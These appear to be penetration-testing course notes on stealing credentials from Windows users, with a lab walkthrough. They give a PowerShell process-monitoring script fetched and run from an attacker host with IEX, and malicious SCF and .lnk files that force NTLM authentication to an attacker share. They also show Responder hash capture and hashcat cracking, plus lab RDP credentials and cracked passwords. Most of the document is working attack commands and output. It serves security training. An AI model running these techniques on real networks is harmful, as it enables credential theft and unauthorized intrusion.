# Interacting with Users

## Traffic Capture

If Wireshark is installed, unprivileged users may be able to capture network traffic, as the option to restrict Npcap driver access to Administrators only is not enabled by default.

https://github.com/DanMcInerney/net-creds

Run from our attack box to sniff passwords and hashes from a live interface or a pcap file

## Process Command Lines

There may be scheduled tasks or other processes being executed which pass credentials on the command line

**Monitoring for Process Command Lines**

```
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

Running Monitor Script on Target Host :

```
IEX (iwr 'http://10.10.10.205/procmon.ps1') 

InputObject                                           SideIndicator
-----------                                           -------------
@{CommandLine=C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =>      
@{CommandLine=“C:\Windows\system32\cmd.exe” }                          =>      
@{CommandLine=\??\C:\Windows\system32\conhost.exe 0x4}                      =>      
@{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd}       =>       
@{CommandLine=“C:\Windows\system32\backgroundTaskHost.exe” -ServerName:CortanaUI.AppXy7vb4pc2... <=
```

## Vulnerable Services

### CVE-2019–15752

CVE-2019–15752 : Vulnerability in Docker Desktop Community Edition before 2.1.0.1

https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e

When this particular version of Docker starts, it looks for several different files, including docker-credential-wincred.exe, docker-credential-wincred.bat

The program looks for these files in the C:\PROGRAMDATA\DockerDesktop\version-bin\

This directory was misconfigured to allow full write access to the BUILTIN\Users group

Any executable placed in that directory would run when a) the Docker application starts and b) when a user authenticates using the command docker login


## SCF on a File Share

### Malicious SCF File

Create the following file and name it something like @Inventory.scf

```
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

2) Starting Responder

```
sudo responder -wrf -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[SMB] NTLMv2-SSP Client   : 10.129.43.30
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...
```

3) Cracking NTLMv2 Hash with Hashcat

```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...:Welcome1
```

## Capturing Hashes with a Malicious .lnk File

This attack no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file :
https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943
https://github.com/dievus/lnkbomb


**Generating a Malicious .lnk File**

```
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

## LAB

xfreerdp /v:10.129.107.74 /u:htb-student /p:HTB_@cademy_stdnt!

SCCM_SVC

vi procmon.ps1

```
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

python3 -m http.server

IEX (iwr 'http://10.10.15.97:8000/procmon.ps1') 

(Other possibilities) :
IEX(New-Object Net.Webclient).downloadString('http://10.10.15.97:8000/procmon.ps1')
curl http://10.10.15.97:8000/procmon.ps1 -O "C:\Users\htb-student\procmon.ps1"


@Inventory.scf

[Shell]
Command=2
IconFile=\\10.10.15.97\share\legit.ico
[Taskbar]
Command=ToggleDesktop


sudo responder -wrf -v -I tun0


[SMB] NTLMv2-SSP Client   : 10.129.107.74
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\sccm_svc
[SMB] NTLMv2-SSP Hash     : sccm_svc::WINLPE-SRV01:20844360d1056e43:29A20404017748D59BD2931FB57DF06D:0101000000000000009BB5CFAC56DA010C54B04981ABC7CE0000000002000800450049004900330001001E00570049004E002D0056005900530047005A0054004C00380059004500430004003400570049004E002D0056005900530047005A0054004C0038005900450043002E0045004900490033002E004C004F00430041004C000300140045004900490033002E004C004F00430041004C000500140045004900490033002E004C004F00430041004C0007000800009BB5CFAC56DA010600040002000000080030003000000000000000010000000020000026A6E8D3AE422BC56B7E1B5D599F8EFE02D5CCCA2409DE404699BF81EE99A7290A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E0039003700000000000000000000000000

hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

SCCM_SVC::WINLPE-SRV01:20844360d1056e43:29a20404017748d59bd2931fb57df06d:0101000000000000009bb5cfac56da010c54b04981abc7ce0000000002000800450049004900330001001e00570049004e002d0056005900530047005a0054004c00380059004500430004003400570049004e002d0056005900530047005a0054004c0038005900450043002e0045004900490033002e004c004f00430041004c000300140045004900490033002e004c004f00430041004c000500140045004900490033002e004c004f00430041004c0007000800009bb5cfac56da010600040002000000080030003000000000000000010000000020000026a6e8d3ae422bc56b7e1b5d599f8efe02d5ccca2409de404699bf81ee99a7290a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e0039003700000000000000000000000000:Password1